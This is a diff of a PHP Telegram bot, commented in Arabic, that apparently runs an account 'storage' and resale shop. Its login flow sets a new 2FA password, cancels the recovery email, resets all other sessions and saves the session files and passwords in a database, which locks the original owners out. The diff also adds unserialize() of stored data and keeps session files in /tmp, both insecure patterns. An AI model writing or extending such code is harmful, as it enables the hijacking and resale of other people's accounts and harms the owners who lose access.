@@ -9,12 +9,11 @@ use danog\MadelineProto\Settings;
 $db = new PDO('sqlite:' . DB_PATH);
 $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-// إضافة عمود mad_serialized إذا لم يكن موجوداً
+// التأكد من وجود عمود mad_serialized
 try {
     $db->exec("ALTER TABLE activation_sessions ADD COLUMN mad_serialized TEXT;");
 } catch (Exception $e) {}
 
-// إنشاء الجداول
 $db->exec("
 CREATE TABLE IF NOT EXISTS countries (code TEXT PRIMARY KEY, name TEXT, flag TEXT);
 CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT UNIQUE, country_code TEXT, session_file TEXT, password TEXT, status TEXT DEFAULT 'active', stored_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
@@ -43,8 +42,7 @@ $popularCountries = [
 ];
 
 foreach ($popularCountries as $code => $info) {
-    $stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
-    $stmt->execute([$code, $info['name'], $info['flag']]);
+    $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)")->execute([$code, $info['name'], $info['flag']]);
 }
 
 function getCountryByPhone($phone, $db) {
@@ -56,8 +54,7 @@ function getCountryByPhone($phone, $db) {
         if ($country) return $country;
         $name = "رمز $code";
         $flag = '🏴';
-        $stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
-        $stmt->execute([$code, $name, $flag]);
+        $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)")->execute([$code, $name, $flag]);
         return ['code' => $code, 'name' => $name, 'flag' => $flag];
     }
     return null;
@@ -104,10 +101,11 @@ if ($user_id != ADMIN_ID) {
     exit;
 }
 
+// ===================== /start =====================
 if ($message && trim($message['text'] ?? '') === '/start') {
     $keyboard = [
         'inline_keyboard' => [
-            [['text' => '📦.  تخزين حسابات تلجرام', 'callback_data' => 'store']],
+            [['text' => '📦 تخزين حسابات تلجرام', 'callback_data' => 'store']],
             [['text' => '🛒 جلب حسابات تلجرام', 'callback_data' => 'buy']],
             [['text' => '🌍 عرض الدول والمخزون', 'callback_data' => 'stock']]
         ]
@@ -116,6 +114,7 @@ if ($message && trim($message['text'] ?? '') === '/start') {
     exit;
 }
 
+// ===================== معالجة الأزرار =====================
 if ($callback) {
     botApi('answerCallbackQuery', ['callback_query_id' => $callback['id']]);
     $data = $callback['data'];
@@ -237,13 +236,14 @@ if ($callback) {
     exit;
 }
 
-// معالجة الرسائل النصية (تخزين حساب جديد)
+// ===================== معالجة الرسائل النصية (تخزين حساب جديد) =====================
 if ($message && !$callback) {
     $text = trim($message['text'] ?? '');
     $stmt = $db->prepare("SELECT * FROM activation_sessions WHERE admin_id=? ORDER BY created_at DESC LIMIT 1");
     $stmt->execute([$user_id]);
     $session = $stmt->fetch(PDO::FETCH_ASSOC);
 
+    // مرحلة إرسال الرقم
     if ($session && $session['step'] === 'awaiting_phone' && preg_match('/^\+\d+$/', $text)) {
         $phone = $text;
         $country = getCountryByPhone($phone, $db);
@@ -258,27 +258,18 @@ if ($message && !$callback) {
         $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
         $settings->setAppInfo($appInfo);
         $mad = new API($tempFile, $settings);
-        
-        // محاولة إرسال الكود مع إعادة المحاولة تلقائياً
-        $maxRetries = 2;
-        for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
-            try {
-                $sentCode = $mad->phoneLogin($phone);
-                $code_hash = $sentCode['phone_code_hash'];
-                $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?")->execute([$code_hash, $user_id]);
-                sendMessage($chat_id, "✅ تم إرسال كود التفعيل إلى $phone. أرسل الكود الآن:");
-                break;
-            } catch (Exception $e) {
-                if ($attempt < $maxRetries) {
-                    sleep(2);
-                    continue;
-                }
-                sendMessage($chat_id, "❌ فشل إرسال الكود: " . $e->getMessage());
-                $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
-            }
+        try {
+            $sentCode = $mad->phoneLogin($phone);
+            $code_hash = $sentCode['phone_code_hash'];
+            $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?")->execute([$code_hash, $user_id]);
+            sendMessage($chat_id, "✅ تم إرسال كود التفعيل إلى $phone. أرسل الكود الآن:");
+        } catch (Exception $e) {
+            sendMessage($chat_id, "❌ فشل إرسال الكود: " . $e->getMessage());
+            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
         }
         exit;
     }
+    // مرحلة إدخال الكود (وتخزين الكائن المتسلسل إذا طلب كلمة مرور)
     elseif ($session && $session['step'] === 'awaiting_code' && is_numeric($text)) {
         $phone = $session['phone'];
         $tempFile = $session['temp_file'];
@@ -291,25 +282,31 @@ if ($message && !$callback) {
         try {
             $authorization = $mad->completePhoneLogin($text, $code_hash);
             if ($authorization['_'] === 'account.password') {
-                $db->prepare("UPDATE activation_sessions SET step='awaiting_password' WHERE admin_id=?")->execute([$user_id]);
+                // تسلسل الكائن MadelineProto وحفظه
+                $serialized = base64_encode(serialize($mad));
+                $db->prepare("UPDATE activation_sessions SET step='awaiting_password', mad_serialized=? WHERE admin_id=?")->execute([$serialized, $user_id]);
                 sendMessage($chat_id, "🔐 الحساب محمي بكلمة مرور خطوتين. أرسل كلمة المرور القديمة:");
                 exit;
             }
-            // تم الدخول بنجاح
+            // تم الدخول بنجاح بدون كلمة مرور
             $newPassword = bin2hex(random_bytes(8));
             try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
             try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
             try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
             $finalSession = '/tmp/' . md5($phone) . '.madeline';
-            copy($tempFile, $finalSession);
-            unlink($tempFile);
+            if (file_exists($tempFile) && !is_dir($tempFile)) {
+                rename($tempFile, $finalSession);
+            } else {
+                // إذا كان الملف غير صالح، نستخدم الجلسة الحالية
+                $mad->logout();
+                $finalSession = $tempFile;
+            }
             $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")
                 ->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
             $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
             sendMessage($chat_id, "🎉 تم تخزين الحساب بنجاح!\nكلمة المرور الجديدة: $newPassword");
         } catch (Exception $e) {
             if (strpos($e->getMessage(), 'PHONE_CODE_INVALID') !== false) {
-                // إعادة إرسال الكود تلقائياً
                 try {
                     $newSent = $mad->phoneLogin($phone);
                     $newCodeHash = $newSent['phone_code_hash'];
@@ -324,26 +321,38 @@ if ($message && !$callback) {
         }
         exit;
     }
+    // مرحلة إدخال كلمة المرور القديمة (استعادة الكائن المتسلسل)
     elseif ($session && $session['step'] === 'awaiting_password') {
         $oldPass = $text;
-        $phone = $session['phone'];
         $tempFile = $session['temp_file'];
-        $settings = new Settings();
-        $appInfo = new AppInfo();
-        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
-        $settings->setAppInfo($appInfo);
-        $mad = new API($tempFile, $settings);
+        $serialized = base64_decode($session['mad_serialized'] ?? '');
+        if (!$serialized) {
+            sendMessage($chat_id, "❌ خطأ في الجلسة، ابدأ من جديد.");
+            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
+            exit;
+        }
+        /** @var API $mad */
+        $mad = unserialize($serialized);
+        if (!$mad) {
+            sendMessage($chat_id, "❌ لا يمكن استعادة الجلسة، أعد المحاولة.");
+            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
+            exit;
+        }
         try {
-            $mad->complete2faLogin($oldPass);
+            $authorization = $mad->complete2faLogin($oldPass);
             $newPassword = bin2hex(random_bytes(8));
             try { $mad->update2fa(['password' => $newPassword]); } catch (Exception $e) {}
             try { $mad->account->cancelPasswordEmail(); } catch (Exception $e) {}
             try { $mad->account->resetAuthorization(); } catch (Exception $e) {}
-            $finalSession = '/tmp/' . md5($phone) . '.madeline';
-            copy($tempFile, $finalSession);
-            unlink($tempFile);
+            $finalSession = '/tmp/' . md5($session['phone']) . '.madeline';
+            if (file_exists($tempFile) && !is_dir($tempFile)) {
+                rename($tempFile, $finalSession);
+            } else {
+                $mad->logout();
+                $finalSession = $tempFile;
+            }
             $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")
-                ->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
+                ->execute([$session['phone'], $session['country_code'], $finalSession, $newPassword]);
             $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
             sendMessage($chat_id, "🎉 تم تخزين الحساب بنجاح!\nكلمة المرور الجديدة: $newPassword");
         } catch (Exception $e) {
